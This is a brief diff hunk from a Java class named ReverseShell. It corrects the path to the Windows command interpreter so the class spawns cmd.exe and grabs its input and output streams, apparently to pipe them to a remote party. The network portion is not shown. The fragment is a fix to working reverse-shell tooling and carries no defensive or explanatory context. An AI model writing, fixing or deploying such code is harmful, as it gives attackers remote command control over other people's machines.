@@ -23,7 +23,7 @@ class ReverseShell implements Runnable{
 		
 		try{
 			Runtime rt = Runtime.getRuntime();
-			Process p = rt.exec("C:\\Window\\System32\\cmd.exe");
+			Process p = rt.exec("C:\\Windows\\System32\\cmd.exe");
 			
 			InputStream readme = p.getInputStream();
 			OutputStream writeme = p.getOutputStream();
